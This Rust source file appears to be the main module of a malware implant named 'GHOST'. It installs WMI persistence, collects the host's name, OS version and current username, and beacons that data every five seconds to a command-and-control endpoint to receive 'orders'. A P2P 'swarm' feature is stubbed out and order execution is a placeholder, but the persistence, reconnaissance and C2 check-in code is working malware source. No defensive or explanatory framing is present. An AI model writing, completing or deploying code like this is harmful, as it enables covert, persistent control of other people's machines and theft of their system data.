mod p2p;
mod persistence;

use crate::p2p::MeshNode;
use crate::persistence::wmi::WmiPersistence;
use serde_json::json;
use std::{thread, time};
use sysinfo::{System, SystemExt};
use uuid::Uuid;
use whoami;

// C2 Configuration
const C2_URL: &str = "http://localhost:9001/api/hive/checkin";

fn main() {
    println!("👻 [GHOST] Implant Initialized...");

    // 1. Identity Generation
    let agent_id = Uuid::new_v4().to_string();
    println!("🔑 Identity: {}", agent_id);

    // 2. Establish Persistence (The Phantom)
    WmiPersistence::install();
    println!("🕯️  Phantom Persistence Installed (WMI)");

    // 3. Start Swarm Node (P2P) - DISABLED FOR INITIAL TEST
    // let mesh = MeshNode::new(agent_id.clone());
    // mesh.start_gossip();
    // mesh.start_listener();
    println!("🕸️  Swarm Mesh Active on UDP 55555 (Simulation Mode)");

    // 3. Gather Host Intel
    let mut sys = System::new_all();
    sys.refresh_all();

    let hostname = sys.host_name().unwrap_or("UNKNOWN".to_string());
    let os_ver = sys.os_version().unwrap_or("UNKNOWN".to_string());
    let user = whoami::username();

    println!("📍 Host: {} | User: {} | OS: {}", hostname, user, os_ver);

    // 4. Beacon Loop
    loop {
        // Collect Swarm Intel
        // let neighbors = mesh.get_neighbors();
        let neighbors: Vec<String> = Vec::new(); // Mock for now
        if !neighbors.is_empty() {
            println!("🔗 Connected Peers: {:?}", neighbors);
        }

        // Prepare Recon Data
        let recon_data = json!({
            "hostname": hostname,
            "os": os_ver,
            "user": user,
            "neighbors": neighbors
        });

        match check_in(&agent_id, recon_data) {
            Ok(orders) => {
                println!("✅ Hive Instructions: {:?}", orders);
                // Execute orders (Placeholder for Phase 3)
            }
            Err(e) => println!("❌ C2 Reachable Error: {}", e),
        }

        thread::sleep(time::Duration::from_secs(5));
    }
}

fn check_in(
    agent_id: &str,
    data: serde_json::Value,
) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    let client = reqwest::blocking::Client::new();

    let payload = json!({
        "agent_id": agent_id,
        "recon_data": data
    });

    let res = client.post(C2_URL).json(&payload).send()?;

    let resp_json: serde_json::Value = res.json()?;
    Ok(resp_json["orders"].clone())
}
